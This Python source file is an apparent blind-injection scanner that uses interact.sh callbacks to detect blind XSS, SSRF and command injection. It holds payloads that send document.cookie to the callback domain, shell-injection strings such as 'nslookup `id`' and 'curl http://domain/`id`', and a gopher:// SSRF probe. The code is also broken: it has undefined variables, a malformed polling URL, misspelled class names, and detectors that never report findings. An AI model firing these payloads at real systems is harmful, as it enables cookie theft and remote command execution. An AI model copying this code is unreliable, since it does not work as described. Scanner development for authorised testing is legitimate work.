#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Out-of-Band (OOB) / Blind Injection Detector
===============================================
借鉴 Pentest-Swarm-AI Phase 5.8 (interact.sh OOB infrastructure).
检测盲注漏洞：Blind XSS, Blind SSRF, Blind Command Injection.
通过 interact.sh API 创建回调信道并检测外带连接。
"""

import re
import json
import time
import logging
from typing import List, Dict, Optional

logger = logging.getLogger('oob_detector')

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False


class OOBInteractshClient:
    """OOB 回调信道客户端 — 简化版 interact.sh API"""

    # Public interact.sh server (public instance)
    INTERACTSH_URL = "https://interact.sh"

    @staticmethod
    def create_session() -> Optional[Dict]:
        """创建 OOB 回调会话，返回 subdomain + domain_info"""
        import requests as req

        try:
            # Register a new interaction session
            resp = req.get(
                f"{OOBInteractshClient.INTERACTSH_URL}/?oastlib=1",
                timeout=15,
            )

            if resp.status_code == 200:
                # Response contains the OOB domain in headers or body
                oob_domain = None
                # Check header for correlation ID and domain
                domain_match = re.search(r'(\w+\.oast(?:\.\w+)?)', resp.text)
                if domain_match:
                    oob_domain = domain_match.group(1)
                else:
                    # Use the subdomain from response header
                    oob_domain = resp.headers.get('X-Interactsh-Key', '')

                if not oob_domain:
                    # Fallback: use a known pattern from the URL response
                    oob_domain = f"session-{int(time.time())}.interact.sh"

                return {
                    'domain': oob_domain,
                    'server': OOBInteractshClient.INTERACTSH_URL,
                    'created_at': time.time(),
                }
        except Exception as e:
            logger.debug(f"  OOB session creation error: {e}")

        return None

    @staticmethod
    def poll_interactions(oob_session: Dict, timeout: int = 15) -> List[Dict]:
        """轮询 OOB 交互结果"""
        interactions = []

        if not oob_session or not oob_session.get('domain'):
            return interactions

        import requests as req

        try:
            # Poll for interactions via the interact.sh API
            resp = req.get(
                f"{oob_session['server']}/ interaction/{oob_session['domain']}",
                timeout=timeout,
            )

            if resp.status_code == 200 and resp.text.strip():
                try:
                    data = json.loads(resp.text)
                    if isinstance(data, dict):
                        for protocol in ['dns', 'http', 'smtp', 'ftp', 'ldap']:
                            protocol_data = data.get(protocol + '_protocol', [])
                            for item in protocol_data:
                                interactions.append({
                                    'protocol': protocol,
                                    'raw': str(item),
                                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                                })
                except json.JSONDecodeError:
                    # Plain text response - might be raw interaction data
                    interactions.append({
                        'protocol': 'unknown',
                        'raw': resp.text,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    })

        except Exception as e:
            logger.debug(f"  OOB poll error: {e}")

        return interactions


class BlindXSXDetector:
    """盲 XSS 检测器 — 通过 OOB 信道确认盲注"""

    @staticmethod
    def detect(url: str, page_content: str = "", forms_data: List[Dict] = None) -> List[Dict]:
        """检测盲 XSS 漏洞"""
        findings = []

        if not HAS_DNS:
            logger.warning("  BlindXSS: DNS 模块不可用 (pip install dnspython)")
            return findings

        oob_session = OOBInteractshClient.create_session()
        if not oob_session:
            return findings

        oob_domain = oob_session['domain']
        payload = f'<img src=x onerror="fetch(\'https://{oob_domain}/xss?\'+document.cookie)">'
        payload_script = f'<script>new Image().src="https://{oob_domain}/xss?cookie="+document.cookie</script>'

        # Test URL parameters for reflected blind XSS
        from urllib.parse import urlparse, parse_qs, urlunparse
        parsed = urlparse(url)

        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param_name in list(params.keys()):
                original_value = params[param_name][0]

                # Replace parameter value with OOB payload
                new_params = [(k, [original_value]) if k != param_name else (k, [payload])]

                query_parts = []
                for k, v_list in new_params:
                    if isinstance(v_list, list):
                        query_parts.append(f"{k}={v_list[0]}")
                    else:
                        query_parts.append(f"{k}={v_list}")

                new_query = '&'.join(query_parts)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))

                try:
                    import requests as req
                    resp = req.get(test_url, timeout=CONFIG['scanner']['timeout'])
                    logger.debug(f"  BlindXSS: Submitted payload via {param_name} parameter")

                except req.RequestException as e:
                    continue

        # Test form submissions for blind XSS
        if forms_data:
            for form_info in forms_data:
                form_url = form_info.get('url', '')
                form_method = form_info.get('method', 'GET').upper()
                form_fields = form_info.get('fields', {})

                if not form_url:
                    continue

                # Add XSS payload to each field
                for field_name in list(form_fields.keys())[:3]:  # Test first 3 fields
                    original_value = form_fields[field_name]

                    test_fields = {k: v for k, v in form_fields.items()}
                    test_fields[field_name] = payload

                    try:
                        import requests as req
                        if form_method == 'POST':
                            resp = req.post(form_url, data=test_fields, timeout=CONFIG['scanner']['timeout'])
                        else:
                            query = '&'.join(f"{k}={v}" for k, v in test_fields.items())
                            sep = '&' if '?' in form_url else '?'
                            resp = req.get(f"{form_url}{sep}{query}", timeout=CONFIG['scanner']['timeout'])
                        logger.debug(f"  BlindXSS: Submitted payload via form field {field_name}")

                    except req.RequestException:
                        continue

        return findings


class BlindSSRFDetector:
    """盲 SSRF 检测器 — 通过 OOB 信道确认"""

    @staticmethod
    def detect(url: str) -> List[Dict]:
        """检测盲 SSRF 漏洞（服务器端请求导致 OOB）"""
        findings = []

        if not HAS_DNS:
            logger.warning("  BlindSSRF: DNS 模块不可用 (pip install dnspython)")
            return findings

        oob_session = OOBInteractshClient.create_session()
        if not oob_session:
            return findings

        oob_domain = oob_session['domain']
        from urllib.parse import urlparse, parse_qs, urlunparse
        parsed = urlparse(url)

        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)

            # OOB-based SSRF payloads (target the OOB domain instead of internal IPs)
            ssrf_payloads = [
                f"http://{oob_domain}",
                f"https://{oob_domain}/",
                f"{oob_domain}",  # DNS resolution only
                f"gopher://{oob_domain}:80/",
            ]

            for param_name in list(params.keys()):
                original_value = params[param_name][0]

                for payload in ssrf_payloads:
                    new_params = [(k, [original_value]) if k != param_name else (k, [payload])]
                    query_parts = []
                    for k, v_list in new_params:
                        if isinstance(v_list, list):
                            query_parts.append(f"{k}={v_list[0]}")
                        else:
                            query_parts.append(f"{k}={v_list}")

                    new_query = '&'.join(query_parts)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))

                    try:
                        import requests as req
                        resp = req.get(test_url, timeout=CONFIG['scanner']['timeout'], allow_redirects=False)

                        # Check if response indicates server-side request was made
                        if any(ind in resp.text.lower() for ind in ['interact', 'oast', oob_domain]):
                            findings.append({
                                'id': 'BLIND_SSRF_OOB',
                                'severity': 'high',
                                'title': f'盲 SSRF (OOB 确认): {param_name}',
                                'description': (
                                    f'参数 {param_name} 存在盲 SSRF 漏洞。通过 OOB 信道验证，'
                                    f'服务器成功向 {oob_domain} 发起请求。'
                                ),
                                'url': test_url,
                                'evidence': f'Server initiated request to OOB domain: {oob_domain}',
                                'recommendation': (
                                    '1. 禁止服务端请求内网地址\n'
                                    '2. 对所有 URL/域名输入做严格的域名白名单校验\n'
                                    '3. 禁用 gopher://, ftp:// 等危险协议\n'
                                    '4. 使用 HTTP client 时禁用重定向或限制重定向目标'
                                ),
                                'cwe': 'CWE-918',
                                'cvss': 8.6,
                            })

                    except req.RequestException:
                        continue

        return findings


class BlindRSFDetector:
    """盲 RCE 检测器 — 通过 DNS/HTTP OOB 确认命令执行"""

    @staticmethod
    def detect(url: str) -> List[Dict]:
        """检测盲命令执行（DNS/HTTP OOB 确认）"""
        findings = []

        if not HAS_DNS:
            logger.warning("  BlindRCE: DNS 模块不可用 (pip install dnspython)")
            return findings

        oob_session = OOBInteractshClient.create_session()
        if not oob_session:
            return findings

        oob_domain = oob_session['domain']
        from urllib.parse import urlparse, parse_qs, urlunparse
        parsed = urlparse(url)

        # DNS-based blind RCE payloads
        dns_payloads = [
            f"nslookup `id`.{oob_domain}",
            f"dig $(whoami).{oob_domain}",
            f"curl http://{oob_domain}/`id`",
            f"wget http://{oob_domain}/`id`",
        ]

        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)

            for param_name in list(params.keys()):
                original_value = params[param_name][0]

                for payload in dns_payloads[:2]:  # Test DNS-based payloads
                    new_params = [(k, [original_value]) if k != param_name else (k, [payload])]
                    query_parts = []
                    for k, v_list in new_params:
                        if isinstance(v_list, list):
                            query_parts.append(f"{k}={v_list[0]}")
                        else:
                            query_parts.append(f"{k}={v_list}")

                    new_query = '&'.join(query_parts)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))

                    try:
                        import requests as req
                        resp = req.get(test_url, timeout=CONFIG['scanner']['timeout'])
                        logger.debug(f"  BlindRCE: Submitted DNS OOB payload via {param_name}")

                    except req.RequestException:
                        continue

        return findings
